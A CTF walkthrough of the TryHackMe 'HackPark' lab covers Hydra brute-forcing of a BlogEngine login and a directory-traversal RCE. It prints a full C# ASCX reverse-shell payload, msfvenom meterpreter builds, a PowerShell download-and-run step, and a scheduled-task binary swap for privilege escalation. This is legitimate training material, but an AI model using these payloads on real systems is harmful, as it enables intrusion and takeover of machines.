# HackPark Walkthrough
<br/>


## Intro
Welcome into the HackPark challenge, here is the link to the [room](https://tryhackme.com/r/room/hackpark) on TryHackMe.
Here we are gonna practice using Hydra to brute force a login, leverage a vulnerability to gain initial foothold thanks to a public exploit and finally escalate the privileges in the Windows machine.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
We can visit the website by navigating with our browser to `http://MACHINE_IP`, here we can see a simple page with the picture of the famous clown called REDACTED_NAME.
Looking around we can notice a login page but since we do not have any credentials we need to find another way to get access.

One way is to brute force the login using a tool like *Hydra*.

Before doing it let's intercept with Burp Suite a test submission to the login form, using `admin` as username and `test` as password, we can see that it will send a post request and return us the message `Login failed` as the password is wrong.

With this information we can now craft the Hydra command:

In our case we will use it to perform a dictionary attack only against the password field, as we can guess the username is admin; we can do it by running:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt mMACHINE_IP http-post-form "/Account/login.aspx:__VIEWSTATE=VgU7%2FWVg7M%2FeO0p9LoITKRUZBvXEG5paMfPAJoPzDF0020aXIZ45CW6XCx3lBu10xOZLc%2FSweTEQ083fWbHhnUkMzDkXMSgyEMRYDK6RzxaD8ZfaOieY7TR7o32srRFS5xqUps0EuztzgKRFE2VfF8SPCgwpPRYYCSAos5QXW2spzwIR&__EVENTVALIDATION=vqsvoJhgEEPF0rfjvrmRawXEtX9YcTEz71rYpzm079wcM7ZpO9q%2FAqvZS70wHZOmzAp8vv3NZVua3zj4LYsv0%2BLp3l%2FRQ5thC9dKQq6Ly8LNxU7tCSC4o%2Fd2ljbjK6m5JxHD%2BWUAbXE1kgYJGrPAMdeHyrpWxxM%2F9OC1panpj9UyHEm3&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -t 64 -vV
```

The part inside the double quotes can be copied and pasted from the request you have captured in Burp Suite, you only need to change from `Password=test` to `Password=^PASS^`

Wait for about 1 minute and you should see a green line in you terminal presenting the successful request with the password: REDACTED

### Finding the CVE and getting a Shell
Time to login in, now we can access and explore the admin panel and functionalities in search of something that can give us a foothold into the target machine.
Going to the "About" section on the left panel we can see that the BlogEngine is version REDACTED, now we can research online if this specific version has any known vulnerabilities.
We can see on ExploitDB the CVE-REDACTED which exploits a Directory Traversal vulnerability to gain RCE on the target.

In order to get the RCE we have to take a couple of steps:
1. Go to the URL: `http://MACHINE_IP/admin/app/editor/editpost.cshtml`, here choose to edit the admin comment.
2. On your machine create a file called `PostView.ascx` with this code inside:
```ascx
<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.10.10.20", 1234)) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
						
				StringBuilder strInput = new StringBuilder();

				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
    	}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
   	StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    	streamWriter.WriteLine(strOutput);
                    	streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
```
(remember to change the IP and PORT with your own machine one)
4. Click on the icon in the editor to upload the file we have just created
5. Set up a listener on your machine with `nc -lvnp 1234`
6. Activate the exploit visiting: `http://MACHINE_IP/?theme=../../App_Data/files`

In a couple of seconds you should have a reverse shell in your terminal.

### Privilege Escalation
First thing first, let's issue the `whoami` command to see who we are logged as in this Windows system
--> REDACTED

Now to follow the task we can create an executable with *smfvenom*, upload and execute it to get a more stable reverse shell withe meterpreter:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=YOUR_IP LPORT=12345 -f exe -o myshell2.exe
```

Set up an http server:
```bash
python3 -m http.server
```

On the target machine run this command to download the file:
```bash
powershell -c wget "http://YOUR_IP/myshell2.exe" -outfile myshell2.exe
```


On your machine start Metasploit and set up the listener:
```bash
msfconsole
```
```bash
use exploit/multi/handler
```
```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

The set your OpenVPN IP and PORT you want to listen on:
```bash
set LPORT 12345
```
```bash
run
```

Now on the windows machine launch the executable:
```powershell
myshell2.exe
```

Now we can run the command `sysinfo` in the Meterpreter session 

After an analysis we can see that the WindowsScheduler service is suspicious, let's checks its logs:
```powershell
cd "c:\Program Files (x86)\SystemScheduler\Events"
```

Reading this log file (`20198415519.INI_LOG.txt`) we can understand that we will have to exploit the ==Message.exe== binary.

The idea here is to create a custom binary called Message.exe, rename the old one on the machine, wait for the Task Scheduler to run it as Admin and get an elevated session.
So let's create another `.exe` file with *msfvenom*:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=YOUR_IP LPORT=8888 -f exe -o reverse_shell.exe
```

In the Meterpreter session navigate to: `c:\Program Files (x86)\SystemScheduler` rename the old Message.exe and run:
```bash
mv Message.exe Message2.exe
```
```bash
upload reverse_shell.exe
```

Finally change the shell name:
```bash
mv reverse_shell.exe Message.exe
```

Set up another listener on port 8888 and finally wait for the shell.
Now we can finally read the 2 flags located at:
- `c:\Users\jeff\Desktop\user.txt`
- `c:\Users\Administrator\Desktop\root.txt`
  

### WinPEAS 
Another way to automate the enumeration process once you have access to a Windows machine is to use this script, which can be downloaded from GitHub [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat or if you are using Kali inside this directory `/usr/share/peass/winpeas`.
You can transfer it the way you like on the target and run it, it will output in the terminal all the results on its scan.

<br/>
<br/>

Congratulations you have successfully used Hydra to brute-force a website's login, found the CVE and used the Metasploit framework to get a reverse shell and enumerate the system to finally escalate your privilege and have access to the flags.

Catch you in the next CTF 😃 

